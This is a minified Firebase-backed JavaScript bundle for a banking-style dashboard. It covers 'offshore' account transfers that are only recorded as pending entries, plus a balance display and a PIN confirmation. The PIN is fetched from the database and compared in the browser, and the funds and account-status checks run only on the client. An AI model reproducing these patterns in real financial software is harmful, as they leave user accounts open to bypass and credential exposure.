import"./modulepreload-polyfill-B5Qt9EMX.js";import{a as A,d as M,u as L,g as E,b as x,o as _,k as O}from"./firebase-client-Drf6QgQf.js";import"./firebase-config-D2Ob3NcO.js";window.auth=A;window.db=M;window.firestoreHelpers={doc:x,getDoc:E,updateDoc:L};window.executeTransfer=async function(){try{const o=window.auth.currentUser;if(!o)throw new Error("No user is signed in");const t=x(window.db,"users",o.uid),i=await E(t);if(!i.exists())throw new Error("User account not found");const e=i.data();switch((e.status||"inactive").toLowerCase()){case"suspended":throw new Error("Your account is currently suspended. Please contact support for assistance.");case"inactive":throw new Error("Your account is inactive. Please activate your account to make transfers.");case"banned":throw new Error("This account has been banned. Please contact support for more information.");case"processing":throw new Error("Your account is currently under review. Please try again later.");case"active":break;default:throw new Error("Unable to verify account status. Please contact support.")}let r=document.getElementById("bankName").value,c=document.getElementById("accountNumber").value,s=document.getElementById("accountName").value,d=parseFloat(document.getElementById("withdrawCash").value.replace(/[^0-9.]/g,""))||0,m=document.getElementById("swiftCode").value,I=document.getElementById("paymentDescription").value,C="TRX"+Math.floor(Math.random()*1e6);const T=document.getElementById("fundingSource"),w=T?T.value:"";if(!w)throw new Error("Funding source is required");let u=0,p="";if(w==="fixed_banking"){const l=e.deposit??0;u=typeof l=="string"?parseFloat(l.replace(/[^0-9.-]/g,""))||0:parseFloat(l)||0,p="Checking Offshore"}else if(w==="savings_banking"){const l=e.fixed??0;u=typeof l=="string"?parseFloat(l.replace(/[^0-9.-]/g,""))||0:parseFloat(l)||0,p="Savings Offshore"}if((isNaN(u)||u<0)&&(u=0),console.log("Final balance check in executeTransfer:",{fundingSource:w,accountType:p,transferAmount:d,accountBalance:u,rawUserData:{deposit:e.deposit,fixed:e.fixed,savings:e.savings,checking:e.checking,wallet:e.wallet,profit:e.profit,fixed_banking:e.fixed_banking,savings_banking:e.savings_banking}}),d>u)throw new Error(`Insufficient funds available in ${p}`);const b=d*1e-4,D=new Date,P=D.toLocaleTimeString("en-US",{hour12:!0,hour:"2-digit",minute:"2-digit"}),S=D.toLocaleDateString("en-US",{month:"2-digit",day:"2-digit",year:"numeric"}),B=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",minimumFractionDigits:2,maximumFractionDigits:2}).format(d),g=`${r} - Twenty Third & Forth  |  Transfer-Intl  |  ${B} |  ${P}  |  ${S}  |  Pending`,k=e.pending1||"",N=e.pending2||"",F=e.pending3||"",U=e.pending4||"",$=e.pending5||"";let a="",f={};if(!k)a="pending1",f={pending1:g};else if(!N)a="pending2",f={pending2:g};else if(!F)a="pending3",f={pending3:g};else if(!U)a="pending4",f={pending4:g};else if(!$)a="pending5",f={pending5:g};else throw document.getElementById("pendingLimitReached").classList.remove("hidden"),new Error("Maximum pending transactions reached. This transaction has been queued as you have 5 pending transactions already. Cheers!");a&&(await L(t,f),console.log(`Transfer string saved in Firebase as ${a}:`,g));const R={bankName:r,accountNumber:c,accountName:s,transferAmount:B,swiftCode:m,transferType:selectedTransferType||"Domestic",paymentDescription:I,transactionRef:C,fee:b.toFixed(2),pendingSlot:a};await sendTransferDetails(R),document.getElementById("beneficiaryName").innerText=s,document.getElementById("beneficiaryAccount").innerText=c,document.getElementById("beneficiaryBank").innerText=r,document.getElementById("transferAmount").innerText=B,document.getElementById("transferFee").innerText=`$${b.toFixed(2)}`,document.getElementById("transactionRef").innerText=C,document.getElementById("receiptPaymentDescription").innerText=I||"-",selectedTransferType==="International"&&m?(document.getElementById("swiftCodeReceiptSection").classList.remove("hidden"),document.getElementById("receiptSwiftCode").innerText=m):document.getElementById("swiftCodeReceiptSection").classList.add("hidden"),document.getElementById("spinner").classList.add("hidden"),document.getElementById("successModal").classList.remove("hidden")}catch(o){console.error("Error executing transfer:",o),document.getElementById("spinner").classList.add("hidden"),showErrorModal(o.message)}};let v=!1,h=!1,y=null;_(window.auth,async o=>{if(y&&(clearTimeout(y),y=null),o){h=!0,v=!0;const t=document.getElementById("Deposit-account"),i=document.getElementById("Profit-wallet"),e=document.getElementById("wallet"),n=document.getElementById("welcome-message");t&&(t.textContent="Loading..."),i&&(i.textContent="Loading..."),e&&(e.textContent="Loading..."),n&&(n.textContent="Loading...");try{const r=x(window.db,"users",o.uid),c=await Promise.race([E(r),new Promise((s,d)=>setTimeout(()=>d(new Error("Timeout")),2e3))]);if(c.exists()){const s=c.data();t&&(t.textContent=`${s.deposit||"0.00"}`),i&&(i.textContent=`${s.profit||"0.00"}`),e&&(e.textContent=`${s.wallet||"0.00"}`),n&&(n.textContent=`Welcome ${s.name||s.firstName||"User"}`)}else console.log("No user document found in Firestore."),t&&(t.textContent="0.00"),i&&(i.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}catch(r){console.error("Error loading user data:",r),t&&(t.textContent="0.00"),i&&(i.textContent="0.00"),e&&(e.textContent="0.00"),n&&(n.textContent="Welcome User")}}else v||(await new Promise(t=>setTimeout(t,500)),v=!0),h?console.log("User state changed to null, but user was previously authenticated. Waiting..."):y=setTimeout(()=>{const t=window.auth.currentUser;!t&&!h?(console.log("No user signed in after verification. Redirecting to sign-in page."),window.location.href="login.html"):t&&(console.log("Auth state changed - user is now authenticated, canceling redirect"),h=!0)},1e3)});window.signOut=function(){O(window.auth).then(()=>{alert("Signed out successfully!"),window.location.href="login.html"}).catch(o=>{alert("Error signing out: "+o.message)})};window.validatePin=async function(){const o=document.getElementById("securityPin").value.trim(),t=document.getElementById("confirmButton"),i=document.getElementById("confirmButtonText"),e=document.getElementById("confirmButtonLoader"),n=document.getElementById("securityPinError");n.classList.add("hidden"),t.disabled=!0,i.textContent="Processing...",e.classList.remove("hidden"),document.getElementById("spinner").classList.remove("hidden");try{const r=window.auth.currentUser;if(r){const c=x(window.db,"users",r.uid),s=await E(c);if(s.exists()){const m=s.data().pin;m?o===m?(document.getElementById("securityPinModal").classList.add("hidden"),executeTransfer()):(n.textContent="Incorrect Pin. Please try again.",n.classList.remove("hidden")):(n.textContent="Please update your PIN in settings.",n.classList.remove("hidden"),window.location.href="pin.html")}}}catch(r){console.error("Error validating PIN:",r),n.textContent="Error validating PIN. Please try again.",n.classList.remove("hidden")}finally{t.disabled=!1,i.textContent="Confirm",e.classList.add("hidden"),document.getElementById("spinner").classList.add("hidden")}};document.addEventListener("DOMContentLoaded",function(){const o=document.getElementById("confirmButton");o&&o.addEventListener("click",window.validatePin)});
